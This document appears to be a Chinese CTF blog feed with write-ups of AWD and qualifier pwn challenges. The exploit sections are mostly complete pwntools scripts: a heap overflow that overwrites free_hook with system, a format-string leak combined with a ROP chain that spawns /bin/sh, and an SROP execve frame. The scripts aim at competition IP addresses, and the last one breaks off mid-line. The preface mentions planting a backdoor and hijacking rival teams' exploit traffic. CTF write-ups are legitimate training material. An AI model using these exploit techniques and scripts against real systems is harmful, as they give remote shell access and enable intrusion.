    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>下次pwn选手真的不该去429线下。。这BGM神TM的= =。。</p><p>比赛很稳，主队拿了第7，分队第12，不过需要反思的是：</p><p>1、解pwn的速度还需要提升（awd形式尽早写出exp拿分很有优势）</p><p>2、web的话一定要防御住、防御住、防御住、重要的话说三遍。。</p><p>3、写好的exp脚本交由负责流量审计的队友来维护</p><p>4、pwn需要一个后门，不然遇到别人劫持了我们的exp流量就很吃亏了。</p><p>5、exp需要将getflag和uploadflag分开，并且分析本轮次没有拿到哪些队伍的flag</p><p>6、IDA分析不了的 ELF二进制文件就交给objdump来分析吧（静态分析软件也就这么几个，遇到二进制文件不能静态分析就惨了。</p><p>7、hook了pwn的read，但是别人没打我们队伍的pwn，估计是怕我们劫持流量。（摊手</p><p>8、十进制和十六进制。。。老是忘记在代码中区分。。ORZ</p><p>进入主题吧</p><a id="more"></a><h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p>第一个开放的题目是pwn2，9点开放的比赛，我在10点10分左右已经将具体利用思路构思完毕（静态分析30分钟+动态分析40分钟），坑爹的是对libc文件进行分析的时候（因为我需要拿到free_hook的地址），IDA无法静态分析，这边消耗了两个小时，写完exp的时候已经是领盒饭12点了。。别人利用这个pwn2已经打了至少18轮，900分。。</p><p>pwn2是一个具有off by one和常规溢出漏洞的二进制程序，他创建的虚表结构如下</p><p>PTR[0]<br>|(Long int)hashcode Length|(char <em>)Name|(char </em>)Hash code|</p><p>PTR[1]<br>|(Long int)hashcode Length|(char <em>)Name|(char </em>)Hash code|</p><p>回过头我们看下这个二进制程序 Hashcode 的input函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">__int64 __<span class="function">fastcall <span class="title">sub_4009DB</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> v3; <span class="comment">// [sp+1Bh] [bp-5h]@2</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [sp+1Ch] [bp-4h]@1</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</div><div class="line">  &#123;</div><div class="line">    v3 = getchar();</div><div class="line">    <span class="keyword">if</span> ( i == a2 )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    *(_BYTE *)(a1 + (<span class="keyword">signed</span> <span class="keyword">int</span>)i) = v3;</div><div class="line">  &#125;</div><div class="line">  *(_BYTE *)((<span class="keyword">signed</span> <span class="keyword">int</span>)i + a1) = <span class="number">0</span>;</div><div class="line">  <span class="keyword">return</span> i;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>记得大一教我C语言的老师说过，C下标的索引是从0开始的,所以a[len(a)]=0 这样的形式会造成1个\x00字节越界赋值。正常来说，这样1个\x00字节，最多覆盖下一个虚表结构的preg_size的结构，但是存在另一个溢出漏洞，我们可以将hashcode的长度可输入长度进行修改（注意，hashcode的可输入区域长度没有变化），这便造成了越界溢出，溢出的数据覆盖到了下一个ptr虚表，利用过程如下（这个利用过程其实没有用到off by one）。</p><ul><li>以下版本没有用off by one 漏洞</li></ul><p>1、创建四个0x20的hashcode</p><p>2、修改ptr[0]的hacode length 0x20至0x40</p><p>3、覆盖ptr[1]表项，复写ptr[1]表项的hashcode length至我们可以复写ptr[2]表项指向hashcode的指针，复写name指针，利用其我们可以泄露出libc地址。</p><p>4、list出所有ptr表项，得到libc地址</p><p>5、复写下下一个ptr表项指向hashcode指针，使其指向libc bss段上的free_hook，然后调用edit hashcode，修改 free_hook使其指向system</p><p>^以上的供读者自己实现，哈哈哈哈哈哈，我用的是比较麻烦的一个版本</p><p>用到off by one 的版本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-26 18:28:36</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils,time</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line">target = <span class="string">"./pwn2"</span></div><div class="line">remote_ip = <span class="string">"172.16.5.22"</span></div><div class="line">port = <span class="number">5009</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line">elf = ELF(<span class="string">"./libc.so.6"</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target)</div><div class="line">gdb.attach(p,<span class="string">"b*0x400C73\nc"</span>)</div><div class="line"><span class="comment"># gdb.attach(p,"b*0x400EF4\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">## stage 1 add hashcode 0x20 id 0</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"md5"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"aaa"</span>)</div><div class="line">ru(<span class="string">"t hashcode\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">0x20</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">## stage 2 add hashcode 0x20 id 1</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"md5"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"aaa"</span>)</div><div class="line">ru(<span class="string">"t hashcode\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">0x20</span>)</div><div class="line"></div><div class="line"><span class="comment">## end add hashcode 0x20 id 2</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"md5"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"/bin/sh\x00"</span>)</div><div class="line">ru(<span class="string">"t hashcode\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">0x20</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">## stage 3 change hashcode length id 0</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"0"</span>)</div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">" hash type\n"</span>)</div><div class="line">sl(<span class="string">"sha256"</span>) <span class="comment">#change length 0x20 to 0x40</span></div><div class="line"></div><div class="line"><span class="comment">## stage 4 edit hashcode</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"0"</span>)</div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"hcode\n"</span>)</div><div class="line">payload = <span class="string">"a"</span>*<span class="number">0x20</span></div><div class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">21</span>)+p64(<span class="number">0x20</span><span class="number">-1</span>)+p64(<span class="number">0</span>)</div><div class="line">sl(payload)</div><div class="line"></div><div class="line"><span class="comment">## stage 5 edit chunk id 0</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"hcode\n"</span>)</div><div class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">21</span>)+p64(<span class="number">0x20</span>)+p64(rop.got(<span class="string">'puts'</span>))[:<span class="number">-1</span>]</div><div class="line">sl(payload)</div><div class="line"></div><div class="line"><span class="comment">## stage 6 leak system addr </span></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"4"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"md5"</span>)</div><div class="line">ru(<span class="string">"input pattern\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">0x20</span>)</div><div class="line">ru(<span class="string">"name="</span>)</div><div class="line"></div><div class="line">puts_addr = u64(ru(<span class="string">"\nhashcode"</span>)[:<span class="number">5</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line"><span class="keyword">print</span> <span class="string">"puts_addr="</span>+hex(puts_addr)</div><div class="line"></div><div class="line">system_addr = puts_addr-(elf.symbols[<span class="string">"puts"</span>]-elf.symbols[<span class="string">"system"</span>])</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"system_addr="</span>+hex(system_addr)</div><div class="line">free_hook_addr = puts_addr+(<span class="number">0x00000035f79906e8</span> - elf.symbols[<span class="string">"puts"</span>])</div><div class="line"><span class="keyword">print</span> <span class="string">"free_hook_addr="</span>+hex(free_hook_addr)</div><div class="line"><span class="comment">## edit atoi to system</span></div><div class="line"></div><div class="line"><span class="comment">## stage 7 edit chunk id 0</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"hcode\n"</span>)</div><div class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">21</span>)+p64(<span class="number">0x48</span><span class="number">-1</span>)+p64(rop.got(<span class="string">'puts'</span>))[:<span class="number">-1</span>]</div><div class="line">sl(payload)</div><div class="line"></div><div class="line"><span class="comment">## stage 8 edit chunk id 1</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"0"</span>)</div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"hcode\n"</span>)</div><div class="line">payload = <span class="string">"a"</span>*<span class="number">0x20</span></div><div class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">21</span>)+p64(<span class="number">0x8</span><span class="number">-1</span>)+p64(<span class="number">0</span>)+p64(free_hook_addr)[:<span class="number">-1</span>]</div><div class="line">sl(payload)</div><div class="line"></div><div class="line"><span class="comment">## stage 9 edit free_hook to system</span></div><div class="line"></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"hcode\n"</span>)</div><div class="line">sl(p64(system_addr)[:<span class="number">-1</span>])</div><div class="line"></div><div class="line"><span class="comment"># stage 10 system</span></div><div class="line">ru(<span class="string">"option:\n"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line">p.interacive()</div></pre></td></tr></table></figure><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>该pwn程序存在两个漏洞，一个是格式化字符串漏洞，一个是栈溢出漏洞，我们可以利用格式化字符串漏洞泄露libc地址，然后利用栈溢出漏洞，构造ropchain，实现shell的获取。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-26 21:39:25</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils</div><div class="line"><span class="keyword">import</span> binascii</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">0</span></div><div class="line">target = <span class="string">"./pwn1"</span></div><div class="line">remote_ip = <span class="string">"172.16.5.43"</span></div><div class="line">port = <span class="number">5011</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line">elf = ELF(target)</div><div class="line"><span class="comment"># libc = ELF("./libc.so.6")</span></div><div class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target)</div><div class="line"><span class="comment"># gdb.attach(p,"b*0x0400C84\nc")</span></div><div class="line"><span class="comment"># gdb.attach(p,"b*0x400EF4\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line">payload = <span class="string">"%19$llX"</span></div><div class="line">binhex = binascii.b2a_hex(payload)</div><div class="line"><span class="comment"># print binhex</span></div><div class="line">ru(<span class="string">" exit\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"0"</span>*(len(binhex)))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(binhex)</div><div class="line">ru(<span class="string">"sult is: \n"</span>)</div><div class="line"></div><div class="line">libc_start_addr = int(ru(<span class="string">"Please "</span>)[:len(<span class="string">"7f041e5cda"</span>)],<span class="number">16</span>) - <span class="number">240</span></div><div class="line"><span class="comment"># print len(libc_start_addr)</span></div><div class="line"><span class="keyword">print</span> <span class="string">"libc_start_addr="</span>+hex(libc_start_addr)</div><div class="line">libc_base = libc_start_addr - <span class="number">0x1ec20</span></div><div class="line">system_addr = libc_base+libc.symbols[<span class="string">"system"</span>]</div><div class="line"><span class="keyword">print</span> <span class="string">"system_addr="</span>+hex(system_addr)</div><div class="line"></div><div class="line">_binsh = libc_base+<span class="number">0x155e43</span></div><div class="line"><span class="keyword">print</span>  <span class="string">"_binsh="</span>+hex(_binsh)</div><div class="line"><span class="comment"># _binsh = libc_base+0x18C385</span></div><div class="line"></div><div class="line">ru(<span class="string">" exit\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"urn\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">payload = p64(system_addr)+p64(<span class="number">0</span>)+p64(_binsh)</div><div class="line">payload = binascii.b2a_hex(payload)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">0x90</span>+payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;下次pwn选手真的不该去429线下。。这BGM神TM的= =。。&lt;/p&gt;
&lt;p&gt;比赛很稳，主队拿了第7，分队第12，不过需要反思的是：&lt;/p&gt;
&lt;p&gt;1、解pwn的速度还需要提升（awd形式尽早写出exp拿分很有优势）&lt;/p&gt;
&lt;p&gt;2、web的话一定要防御住、防御住、防御住、重要的话说三遍。。&lt;/p&gt;
&lt;p&gt;3、写好的exp脚本交由负责流量审计的队友来维护&lt;/p&gt;
&lt;p&gt;4、pwn需要一个后门，不然遇到别人劫持了我们的exp流量就很吃亏了。&lt;/p&gt;
&lt;p&gt;5、exp需要将getflag和uploadflag分开，并且分析本轮次没有拿到哪些队伍的flag&lt;/p&gt;
&lt;p&gt;6、IDA分析不了的 ELF二进制文件就交给objdump来分析吧（静态分析软件也就这么几个，遇到二进制文件不能静态分析就惨了。&lt;/p&gt;
&lt;p&gt;7、hook了pwn的read，但是别人没打我们队伍的pwn，估计是怕我们劫持流量。（摊手&lt;/p&gt;
&lt;p&gt;8、十进制和十六进制。。。老是忘记在代码中区分。。ORZ&lt;/p&gt;
&lt;p&gt;进入主题吧&lt;/p&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
    
      <category term="AWD" scheme="https://winter3un.github.io/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>【pwn】2017-429预赛</title>
    <link href="https://winter3un.github.io/2017/04/22/429-2017/"/>
    <id>https://winter3un.github.io/2017/04/22/429-2017/</id>
    <published>2017-04-22T14:38:33.000Z</published>
    <updated>2017-05-02T13:50:49.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>槽点：这次比赛。。敢不敢。。不放原题。。。做了半天的pwn2，结果是原题。。。 T T  （题目来自hitcon 2016，好吧。。怪我没刷到这题。。</p><p>不过pwn1和pwn2收获都很大，特别记录下。</p><a id="more"></a><h3 id="PWN1"><a href="#PWN1" class="headerlink" title="PWN1"></a>PWN1</h3><p>pwn1很短很强悍~</p><p>用到了SROP技术，参考资料</p><ul><li><a href="http://www.freebuf.com/articles/network/87447.html" target="_blank" rel="external">http://www.freebuf.com/articles/network/87447.html</a></li><li><a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank" rel="external">http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a></li></ul><p>elf文件非常小，只有几行指令。使用syscall 0 读取用户的输入至栈中。<br>我们虽然可以控制程序的执行流，但是我们没办法控制寄存器的数值。正常利用条件为：控制rax为59，控制rdi为“/bin/sh”字符串的地址，rip指向syscall。后来想了想，rax的数值可以通过输入的字符数来控制，那么现在我们已经可以控制syscall调用execute了，但是我们却不能控制rdi的数值，这里我们可以利用SROP的技术，对所有寄存器进行重新赋值，使rdi指向“/bin/sh”的地址。然而利用SROP需要以下几个条件。</p><p>第一，攻击者可以通过stack overflow等漏洞控制栈上的内容；(√)</p><p>第二，需要知道栈的地址（比如需要知道自己构造的字符串<code>/bin/sh</code>的地址）；（√<br>我们可以通过系统调用 1 write函数，进行栈空间信息泄露）</p><p>第三，需要知道<code>syscall</code>指令在内存中的地址(√)；</p><p>第四，需要知道<code>sigreturn</code>系统调用的内存地址(我们可以利用系统调用号 15 调用该函数)。</p><p>因此条件全部满足的情况下，我们利用SROP技术将rdi覆写，那么我们就可以顺利执行 execve（“/bin/sh”,null.null）;啦。（ps：需要注意的是，send过去的数据要有延迟，不然会认为是在一起的）exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-19 23:10:33</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> time</div><div class="line">context(log_level=<span class="string">"debug"</span>,arch=<span class="string">"amd64"</span>)</div><div class="line">DEBUG = <span class="number">0</span></div><div class="line">target = <span class="string">"./smallest"</span></div><div class="line">remote_ip = <span class="string">"106.75.61.55"</span></div><div class="line">port = <span class="number">20000</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target)</div><div class="line"><span class="comment"># gdb.attach(p,"b*main\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">time.sleep(<span class="number">3</span>)</div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line">frame = SigreturnFrame()</div><div class="line">frame.rax = constants.SYS_execve</div><div class="line">frame.rdi = <span class="number">0xdeadbeaf</span></div><div class="line">frame.rsi = <span class="number">0xdeadbeaf</span></div><div class="line">frame.rdx = <span class="number">0xdeadbeaf</span></div><div class="line">frame.rsp = <span class="number">0xdeadbeaf</span></div><div class="line">frame.rip = <span class="number">0x4000BE</span></div><div class="line"></div><div class="line">raw_input()</div><div class="line"></div><div class="line"><span class="comment"># write</span></div><div class="line"></div><div class="line">payload = p64(<span class="number">0x4000B0</span>)+p64(<span class="number">0x4000B3</span>)+p64(<span class="number">0x4000B0</span>)</div><div class="line">sd(payload)</div><div class="line">sd(<span 